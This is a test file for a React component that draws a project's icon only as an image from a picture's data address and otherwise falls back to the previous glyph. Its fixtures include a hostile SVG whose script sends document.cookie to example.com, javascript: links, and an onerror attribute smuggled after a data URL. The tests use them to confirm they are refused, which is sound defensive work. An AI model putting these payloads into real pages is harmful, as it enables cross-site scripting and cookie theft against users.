// A project's own icon (item 100b, part 1): the shell's answer is drawn only as an image from a `data:` address of a picture's type,
// never as markup, and anything else draws what the row showed before. The reading itself (the places, the size cap, links and
// paths outside the folder refused) is the shell's, with its tests in src-tauri/src/project_icon.rs.
import { afterEach, describe, expect, it, vi } from "vitest";
import { renderToString } from "react-dom/server";
import { isIconAddress, ProjectIconView, readProjectIcon, resetProjectIcons } from "./ProjectIcon";
import { KitPanelView, type KitPanelProps } from "./KitPanel";
import { emptyProject } from "./project";

const b64 = (s: string) => btoa(s);
const HOSTILE = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script>fetch('https://example.com/?'+document.cookie)</script><a xlink:href="javascript:alert(1)"><rect width="16" height="16"/></a><image href="https://example.com/x.png"/></svg>`;
const SVG_URL = `data:image/svg+xml;base64,${b64(HOSTILE)}`;

afterEach(() => resetProjectIcons());

describe("what is drawn", () => {
  it("an SVG with a script and a link is drawn only as an image from its data address", () => {
    const html = renderToString(<ProjectIconView icon={SVG_URL} fallback={<i data-testid="glyph" />} />);
    expect(html).toMatch(/^<img [^>]*src="data:image\/svg\+xml;base64,[A-Za-z0-9+/=]+"[^>]*\/?>$/);
    expect(html).toContain('data-testid="project-icon"');
    // nothing of the file is in the page's markup: no svg element, no script, no link, and the glyph is gone
    expect(html).not.toMatch(/<svg|<script|javascript:|xlink|example\.com|glyph/);
  });

  it("a PNG and an ICO are drawn the same way", () => {
    for (const url of ["data:image/png;base64,iVBORw0KGgo=", "data:image/x-icon;base64,AAABAAEAEBA="]) expect(renderToString(<ProjectIconView icon={url} />)).toContain(`src="${url}"`);
  });

  it("anything that is not a picture's data address draws what the row showed before", () => {
    const bad = [
      null,
      "",
      "https://example.com/favicon.ico",
      "javascript:alert(1)",
      `data:text/html;base64,${b64("<script>alert(1)</script>")}`,
      `data:image/svg+xml,${HOSTILE}`,
      `data:image/svg+xml;base64,${b64(HOSTILE)}" onerror="alert(1)`,
      "data:image/gif;base64,R0lGODlh",
      `data:image/png;base64,${"A".repeat(100 * 1024)}`,
    ];
    for (const icon of bad) {
      expect(isIconAddress(icon)).toBe(false);
      const html = renderToString(<ProjectIconView icon={icon} fallback={<i data-testid="glyph" />} />);
      expect(html).toBe('<i data-testid="glyph"></i>');
    }
  });
});

describe("reading", () => {
  it("asks the host it is given for the folder, keeps the answer, and keeps a refused one as none", async () => {
    const host = { projectIcon: vi.fn(async (cwd: string) => (cwd === "/code/site" ? SVG_URL : "javascript:alert(1)")) };
    expect(await readProjectIcon(host, "/code/site")).toBe(SVG_URL);
    expect(await readProjectIcon(host, "/code/app")).toBe(null);
    expect(host.projectIcon.mock.calls).toEqual([["/code/site"], ["/code/app"]]);
  });

  it("a host older than the item, or one that fails, gives none", async () => {
    expect(await readProjectIcon({}, "/code/site")).toBe(null);
    expect(await readProjectIcon({ projectIcon: async () => Promise.reject(new Error("gone")) }, "/code/site")).toBe(null);
  });
});

describe("on the Code page", () => {
  const props = (over: Partial<KitPanelProps> = {}): KitPanelProps => ({
    root: "/code/site",
    projects: ["/code/site"],
    project: emptyProject(),
    keys: [],
    home: "/home/you",
    onProject: () => {},
    onLevel: () => {},
    onAllow: () => {},
    onDropRule: () => {},
    onDropFolder: () => {},
    onOpenSession: () => {},
    ...over,
  });

  it("Kit's band shows the project's icon before its name when it keeps one, and nothing more when it does not", () => {
    const withIcon = renderToString(<KitPanelView {...props({ icon: SVG_URL })} />);
    expect(withIcon).toMatch(/<span class="kit-proj"><img [^>]*data-testid="project-icon"[^>]*\/?><span class="mono" title="\/code\/site">site<\/span><\/span>/);
    const without = renderToString(<KitPanelView {...props()} />);
    expect(without).not.toContain("project-icon");
    expect(without).toContain('<span class="kit-proj"><span class="mono" title="/code/site">site</span></span>');
  });
});
